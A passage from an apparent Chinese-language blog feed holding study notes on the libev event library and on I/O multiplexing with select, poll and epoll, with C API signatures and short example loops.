    <content type="html"><![CDATA[<h1 id="libev学习笔记"><a href="#libev学习笔记" class="headerlink" title="libev学习笔记"></a>libev学习笔记</h1><h3 id="1-什么是libev"><a href="#1-什么是libev" class="headerlink" title="1.什么是libev?"></a>1.什么是libev?</h3><p>libev是一个强大的网络reactor,支持多种事件(信号,I&#x2F;O,定时器…..)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//基本数据类型的宏定义</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EV_A  loop </span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EV_A_ EV_A,</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EV_P  struct ev_loop *loop </span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> EV_P_ EV_P,</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ev_io</span></span><br><span class="hljs-class">&#123;</span><br>  EV_WATCHER_LIST (ev_io)<br>  <span class="hljs-type">int</span> fd;     <span class="hljs-comment">/* ro */</span><br>  <span class="hljs-type">int</span> events; <span class="hljs-comment">/* ro */</span><br>&#125; ev_io;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ev_loop</span></span><br><span class="hljs-class">  &#123;</span><br>    ev_tstamp ev_rt_now;<br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> ev_rt_now ((loop)-&gt;ev_rt_now)</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> VAR(name,decl) decl;</span><br>      <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ev_vars.h&quot;</span></span><br>    <span class="hljs-meta">#<span class="hljs-keyword">undef</span> VAR</span><br>  &#125;;<br></code></pre></td></tr></table></figure><h3 id="2-使用方法"><a href="#2-使用方法" class="headerlink" title="2.使用方法"></a>2.使用方法</h3><h4 id="1-创建ev-loop对象"><a href="#1-创建ev-loop对象" class="headerlink" title="1.创建ev_loop对象"></a>1.创建ev_loop对象</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> ev_loop *<span class="hljs-title function_">ev_loop_new</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flag)</span>;<br><span class="hljs-comment">//创建一个ev_loop对象,这里的flag用于选择什么backend来实现多路复用</span><br><span class="hljs-comment">//flag的一些宏定义,一般用于选择后台多路复用机制,一般使用EVFLAG_AUTO(0)即可</span><br><br>* EVBACKEND_SELECT<br>* EVBACKEND_POLL<br>* EVBACKEND_EPOLL                       <br>* EVBACKEND_KQUEUE<br>* EVBACKEND_DEVPOLL<br>* EVBACKEND_PORT<br><br>* EVFLAG_NOINOTIFY                     <span class="hljs-comment">// 不适用inofity调用来使用ev_stat.这样可以减少fd使用。</span><br>* EVFLAG_SIGNALFD                      <span class="hljs-comment">// 使用signalfd来检测信号是否发生，同样这样可以减少fd</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ev_loop_destroy</span><span class="hljs-params">(EV_P)</span>;<br><span class="hljs-comment">//销毁一个ev_loop对象</span><br></code></pre></td></tr></table></figure><h4 id="2-绑定用户数据以及reactor的开始与退出"><a href="#2-绑定用户数据以及reactor的开始与退出" class="headerlink" title="2.绑定用户数据以及reactor的开始与退出"></a>2.绑定用户数据以及reactor的开始与退出</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-type">void</span> <span class="hljs-title function_">ev_set_userdata</span><span class="hljs-params">(EV_P_ <span class="hljs-type">void</span> *data)</span>;<br>  <span class="hljs-type">void</span> *<span class="hljs-title function_">ev_userdata</span><span class="hljs-params">(EV_P)</span>;<br>  <span class="hljs-comment">//ev_loop如何运行和停止   </span><br>  <span class="hljs-type">void</span> <span class="hljs-title function_">ev_run</span><span class="hljs-params">(EV_P_ <span class="hljs-type">int</span> flags)</span>;<br>  <span class="hljs-type">void</span> <span class="hljs-title function_">ev_break</span><span class="hljs-params">(EV_P_ <span class="hljs-type">int</span> how)</span>;<br>  <span class="hljs-comment">//flags参数</span><br>* <span class="hljs-number">0</span>             <span class="hljs-comment">//通常这是我们想要的，每次轮询在poll都会等待一段时间然后处理pending事件。</span><br>* EVRUN_NOWAIT  <span class="hljs-comment">//运行一次，在poll时候不会等待。这样效果相当于只是处理pending事件。</span><br>* EVRUN_ONCE    <span class="hljs-comment">//运行一次，但是在poll时候会等待，然后处理pending事件。</span><br>而how有下面这几个：<br><br>* EVBREAK_ONE   <span class="hljs-comment">//只是退出一次ev_run这个调用。通常来说使用这个就可以了。</span><br>* EVBREAK_ALL   <span class="hljs-comment">//退出所有的ev_run调用。这种情况存在于ev_run在pengding处理时候会递归调</span><br>ev_set_loop_release_cb (EV_P_ <span class="hljs-type">void</span> (*release)(EV_P) EV_NOEXCEPT, <span class="hljs-type">void</span> (*acquire)(EV_P) EV_NOEXCEPT)     <span class="hljs-comment">//设置回调函数,用于epoll_wait前后调用</span><br></code></pre></td></tr></table></figure><h4 id="3-设置轮询时间"><a href="#3-设置轮询时间" class="headerlink" title="3.设置轮询时间"></a>3.设置轮询时间</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//在event_loop里面我们还关心一件事情，就是每次event_loop轮询的时间长短。通常来说这个不会是太大问题，但是在高性能情况下面我们需要设置</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">ev_set_io_collect_interval</span><span class="hljs-params">(EV_P_ ev_tstamp interval)</span>;<span class="hljs-comment">//设置轮询时间</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">ev_set_timeout_collect_interval</span><span class="hljs-params">(EV_P_ ev_tstamp interval)</span>;<span class="hljs-comment">//设置超时时间</span><br></code></pre></td></tr></table></figure><h4 id="4-Watcher"><a href="#4-Watcher" class="headerlink" title="4.Watcher"></a>4.Watcher</h4><p>watcher 相当于eventhandler,一般ev_loop用于创建libev里面的reactor对象,而watcher就是事件触发后处理事件的模块,通常绑定fd,以及发生事件后处理事件的回调函数,下列的type用于区分不同的watcher<br>watcher的状态</p><ul><li><p>initialiased 已经初始化</p></li><li><p>active 调用start进行注册</p></li><li><p>pending 已经触发事件但是还没有处理</p></li><li><p>inactive 调用stop注销.这个状态和已经初始化是一样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> ev_loop *loop, ev_TYPE *watcher, <span class="hljs-type">int</span> revents)</span> callback; <span class="hljs-comment">// callback都是这种类型</span><br>ev_init (ev_TYPE *watcher, callback);                         <span class="hljs-comment">// 初始化watcher</span><br>ev_TYPE_set (ev_TYPE *watcher, [args]);                       <span class="hljs-comment">// 设置watcher</span><br>ev_TYPE_init (ev_TYPE *watcher, callback, [args]);            <span class="hljs-comment">// 通常使用这个函数最方便，初始化和设置都在这里</span><br>ev_TYPE_start (loop, ev_TYPE *watcher);                       <span class="hljs-comment">// 注册watcher</span><br>ev_TYPE_stop (loop, ev_TYPE *watcher);                        <span class="hljs-comment">// 注销watcher</span><br>ev_set_priority (ev_TYPE *watcher, <span class="hljs-type">int</span> priority);             <span class="hljs-comment">// 设置优先级</span><br>ev_feed_event (loop, ev_TYPE *watcher, <span class="hljs-type">int</span> revents);          <span class="hljs-comment">// 这个做跨线程通知非常有用，相当于触发了某个事件。</span><br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">ev_is_active</span> <span class="hljs-params">(ev_TYPE *watcher)</span>;                         <span class="hljs-comment">// watcher是否active.</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">ev_is_pending</span> <span class="hljs-params">(ev_TYPE *watcher)</span>;                        <span class="hljs-comment">// watcher是否pending.</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ev_clear_pending</span> <span class="hljs-params">(loop, ev_TYPE *watcher)</span>;                <span class="hljs-comment">// 清除watcher pending状态并且返回事件</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="5-实例"><a href="#5-实例" class="headerlink" title="5.实例"></a>5.实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//一个简单的io驱动事件</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ev.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">stdin_cb</span><span class="hljs-params">(EV_P_ ev_io *w,<span class="hljs-type">int</span> revents)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;hello,world&quot;</span>);<br>    ev_io_stop(EV_A_ w);<br>    ev_break(EV_A_ EVBREAK_ALL);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ev_loop</span> *<span class="hljs-title">loop</span>=</span> EV_DEFAULT;<br>    ev_io stdin_watcher;<br>    ev_io_init(&amp;stdin_watcher,stdin_cb,<span class="hljs-number">0</span>,EV_READ);<span class="hljs-comment">//初始化watcher,设置事件处理的回调函数</span><br>    ev_io_start(loop,&amp;stdin_watcher);<span class="hljs-comment">//设置reactor的watcher</span><br>    ev_run(loop,<span class="hljs-number">0</span>);<span class="hljs-comment">//开始监听事件的到来,一旦事件到来,指向对应的watcher中的回调函数</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="6-和epoll对比"><a href="#6-和epoll对比" class="headerlink" title="6.和epoll对比"></a>6.和epoll对比</h4><p>ev_loop相当于struct event_base *base,监听集合<br>watcher相当于struct event *event,但是相比于epoll中的event,watcher中设置了相应的回调函数。<br>ev_run相当于epoll_wait函数开始监听事件的到来,到事件到来的时候调用相应的回调函数处理相应的事件</p>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>I/O多路复用</title>
    <link href="/2022/04/17/I-O%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/"/>
    <url>/2022/04/17/I-O%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="I-x2F-O多路复用"><a href="#I-x2F-O多路复用" class="headerlink" title="I&#x2F;O多路复用"></a>I&#x2F;O多路复用</h1><h3 id="1-什么是I-x2F-O多路复用"><a href="#1-什么是I-x2F-O多路复用" class="headerlink" title="1.什么是I&#x2F;O多路复用"></a>1.什么是I&#x2F;O多路复用</h3><p>I&#x2F;O 多路复用是一种同步IO模型，实现一个线程可以监视多个文件句柄；<br>一旦某个文件句柄就绪，就能够通知应用程序进行相应的读写操作；<br>没有文件句柄就绪就会阻塞应用程序，交出CPU。</p><h3 id="2-为什么会有I-x2F-O多路复用机制"><a href="#2-为什么会有I-x2F-O多路复用机制" class="headerlink" title="2.为什么会有I&#x2F;O多路复用机制"></a>2.为什么会有I&#x2F;O多路复用机制</h3><p>没有IO多路复用机制时，有BIO、NIO两种实现方式，但它们都有一些问题</p><h5 id="1-同步阻塞"><a href="#1-同步阻塞" class="headerlink" title="1.同步阻塞"></a>1.同步阻塞</h5><p>服务端采用单线程，当 accept 一个请求后，在 recv 或 send 调用阻塞时，将无法 accept 其他请求（必须等上一个请求处理 recv 或 send 完 ）（无法处理并发）</p><p>服务端采用多线程，当 accept 一个请求后，开启线程进行 recv，可以完成并发处理，但随着请求数增加需要增加系统线程，大量的线程占用很大的内存空间，并且线程切换会带来很大的开销，10000个线程真正发生读写实际的线程数不会超过20%，每次accept都开一个线程也是一种资源浪费。</p><h5 id="2-异步阻塞"><a href="#2-异步阻塞" class="headerlink" title="2.异步阻塞"></a>2.异步阻塞</h5><p>服务器端当 accept 一个请求后，加入 fds 集合，每次轮询一遍 fds 集合 recv (非阻塞)数据，没有数据则立即返回错误，每次轮询所有 fd （包括没有发生读写实际的 fd）会很浪费 CPU资源</p><h3 id="3-实现I-x2F-O多路复用的几种方式"><a href="#3-实现I-x2F-O多路复用的几种方式" class="headerlink" title="3.实现I&#x2F;O多路复用的几种方式"></a>3.实现I&#x2F;O多路复用的几种方式</h3><ul><li><p>1.select</p></li><li><p>2.poll</p></li><li><p>3.epoll</p></li></ul><h4 id="1-select实现I-x2F-O多路复用"><a href="#1-select实现I-x2F-O多路复用" class="headerlink" title="1.select实现I&#x2F;O多路复用"></a>1.select实现I&#x2F;O多路复用</h4><h5 id="1-1-涉及的api"><a href="#1-1-涉及的api" class="headerlink" title="1.1.涉及的api"></a>1.1.涉及的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">select</span><span class="hljs-params">(<span class="hljs-type">int</span> nfds,fd_set *readfds,fd_set *writefds,fd_set exceptfds,<span class="hljs-keyword">struct</span> timeval *timeout)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pselect</span><span class="hljs-params">(<span class="hljs-type">int</span> nfds,fd_set *readfds,fd_set *writefds,fd_set *exceptfds,<span class="hljs-keyword">struct</span> timeval *timeout,<span class="hljs-type">sigset_t</span> sigmask)</span>;<br><span class="hljs-comment">//功能:阻塞监听多个文件描述符的变化(可被信号打断)</span><br><br><span class="hljs-comment">//参数</span><br><span class="hljs-comment">//nfds为监听的最大文件描述符+1</span><br><span class="hljs-comment">//readfds,writefds,exceptfds分别为监听可读，可写,异常集合</span><br><span class="hljs-comment">//timeval为超时时间</span><br><br><span class="hljs-comment">//返回值</span><br><span class="hljs-comment">//正常返回变化的文件描述符总个数,超时返回0,错误返回-1</span><br><br>FD_ZERO(fd_set *<span class="hljs-built_in">set</span>);<br><span class="hljs-comment">//将集合清零</span><br><br>FD_SET(<span class="hljs-type">int</span> fd,fd_set *<span class="hljs-built_in">set</span>);<br><span class="hljs-comment">//将文件描述符添加到集合</span><br><br>FD_CLR(<span class="hljs-type">int</span> fd,fd_set *<span class="hljs-built_in">set</span>);<br><span class="hljs-comment">//将监听的文件描述符从集合中移除</span><br></code></pre></td></tr></table></figure><h5 id="1-2-操作实例"><a href="#1-2-操作实例" class="headerlink" title="1.2.操作实例"></a>1.2.操作实例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span><br>&#123;<br><span class="hljs-type">int</span> fd = New_Socket(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], <span class="hljs-number">10</span>);<br><span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Create Socket error!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br>fd_set fdset, rset;<br><span class="hljs-comment">//创建监听集合</span><br>FD_ZERO(&amp;fdset);<br><span class="hljs-comment">//将需要监听的文件描述符加入到监听集合</span><br>FD_SET(fd, &amp;fdset);<br>    .....<br><span class="hljs-type">int</span> maxfd = fd + <span class="hljs-number">1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">timeout</span> =</span> &#123; <span class="hljs-number">20</span>, <span class="hljs-number">20</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>rset = fdset;<br><span class="hljs-type">int</span> nfds = select(maxfd, &amp;rset, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;timeout);<br>        <span class="hljs-comment">//maxfd为监听的最大的文件描述符+1,maxfd为为轮询机制,每次都会轮询所有的fd看是否发生异常</span><br><span class="hljs-comment">// select函数返回值大于0代表有文件描述符有数据到来,返回值小于0代表发生了异常,返回值等于0代表超时</span><br><span class="hljs-keyword">if</span> (nfds &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;select&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nfds == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;select timeout\n&quot;</span>);<br><span class="hljs-keyword">continue</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (FD_ISSET(fd, &amp;rset)) &#123;<br>Handler(fd, &amp;fdset);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-使用poll实现I-x2F-O多路复用"><a href="#2-使用poll实现I-x2F-O多路复用" class="headerlink" title="2.使用poll实现I&#x2F;O多路复用"></a>2.使用poll实现I&#x2F;O多路复用</h4><h5 id="2-1-涉及的api"><a href="#2-1-涉及的api" class="headerlink" title="2.1.涉及的api"></a>2.1.涉及的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> &#123;</span><br>               <span class="hljs-type">int</span>   fd;         <span class="hljs-comment">/* file descriptor */</span><br>               <span class="hljs-type">short</span> events;     <span class="hljs-comment">/* requested events */</span><br>               <span class="hljs-type">short</span> revents;    <span class="hljs-comment">/* returned events */</span><br>           &#125;;<br><span class="hljs-comment">//fd为监听的文件描述符</span><br><span class="hljs-comment">//events为监听的事件</span><br><span class="hljs-comment">//revents为发生的事件</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">poll</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pollfd *fds,<span class="hljs-type">nfds_t</span> nfds,<span class="hljs-type">int</span> timeout)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">ppoll</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pollfd *fds,<span class="hljs-type">nfds_t</span> nfds,cont <span class="hljs-keyword">struct</span> timespec *tmo_p,<span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *sigmask)</span>;<br><span class="hljs-comment">//功能:同时监听多个文件描述符,底层原理和select一样,只是将原有的fd_set改为了struct pollfd结构体</span><br><br><span class="hljs-comment">//参数 </span><br><span class="hljs-comment">//fds,监听的pollfd的数组指针,nfds,监听的文件描述符的个数,timeout为超时时间,sigmask为屏蔽的信号集合</span><br><br><span class="hljs-comment">//返回值</span><br><span class="hljs-comment">//成功时返回一个正数(具有非零revents的结构体数量)</span><br><span class="hljs-comment">//错误时</span><br><span class="hljs-comment">// EFAULT 给出的参数不在可用的调用地址空间内.</span><br><span class="hljs-comment">// EINTR  被信号打断</span><br><span class="hljs-comment">// EINVAL nfds 值超过了 RLIMIT_NOFILE 值。</span><br><span class="hljs-comment">// EINVAL (ppoll()) The timeout value expressed in *ip is invalid (negative).</span><br><span class="hljs-comment">// ENOMEM 没有空间来分配文件描述符表</span><br></code></pre></td></tr></table></figure><h5 id="2-2-操作实例"><a href="#2-2-操作实例" class="headerlink" title="2.2.操作实例"></a>2.2.操作实例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> fd;<span class="hljs-comment">//需要监听的文件描述符</span><br>    <span class="hljs-type">short</span> event;<span class="hljs-comment">//需要监听的事件</span><br>    <span class="hljs-type">short</span> revent;<span class="hljs-comment">//已经发生的事件</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FD 100</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fd</span>[<span class="hljs-title">MAX_FD</span>];</span><br>    <span class="hljs-comment">//设置监听事件和监听的文件描述符</span><br>    fd[i].event = POLLIN<br>    <span class="hljs-comment">//设置完成后</span><br>    <span class="hljs-type">int</span> nfds = poll(<span class="hljs-keyword">struct</span> pollfd fds[], <span class="hljs-type">nfds_t</span> nfds, <span class="hljs-type">int</span> timeout);<br><span class="hljs-comment">//比较revent看revent是否发生了变化,若发生了变化则文件描述符则该文件描述符有数据到来</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;MAX_FD,i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span>(fd[i].revent &amp; POLLIN)<br>        .....<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-使用epoll实现I-x2F-O多路复用"><a href="#3-使用epoll实现I-x2F-O多路复用" class="headerlink" title="3.使用epoll实现I&#x2F;O多路复用"></a>3.使用epoll实现I&#x2F;O多路复用</h4><h5 id="3-1-涉及的api"><a href="#3-1-涉及的api" class="headerlink" title="3.1.涉及的api"></a>3.1.涉及的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_create</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>;<br><span class="hljs-comment">// 内核中间加一个 ep 对象，把所有需要监听的 socket 都放到 ep 对象中,返回一个ep对象,linux2.6.8开始忽略了size的意义</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_ctl</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-type">int</span> op, <span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> epoll_event *event)</span>;<br><span class="hljs-comment">//负责把 socket 增加、删除到内核红黑树</span><br><span class="hljs-comment">//参数:epfd为ep对象,op为操作类型,fd为监听的文件描述符</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_wait</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-keyword">struct</span> epoll_event * events, <span class="hljs-type">int</span> maxevents, <span class="hljs-type">int</span> timeout)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">epoll_pwait</span><span class="hljs-params">(<span class="hljs-type">int</span> epfd, <span class="hljs-keyword">struct</span> epoll_event * events, <span class="hljs-type">int</span> maxevents, <span class="hljs-type">int</span> timeout,<span class="hljs-type">const</span> <span class="hljs-type">sigset_t</span> *sigmask)</span>;<br><span class="hljs-comment">//负责检测可读队列，没有可读 socket 则阻塞进程,epfd为ep对象,events,为发生存储已经发生事件的结构体数组，maxevents为最大可发生的事件的文件描述符的数量,timeout为超时时间</span><br></code></pre></td></tr></table></figure><h5 id="3-2-操作实例"><a href="#3-2-操作实例" class="headerlink" title="3.2.操作实例"></a>3.2.操作实例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 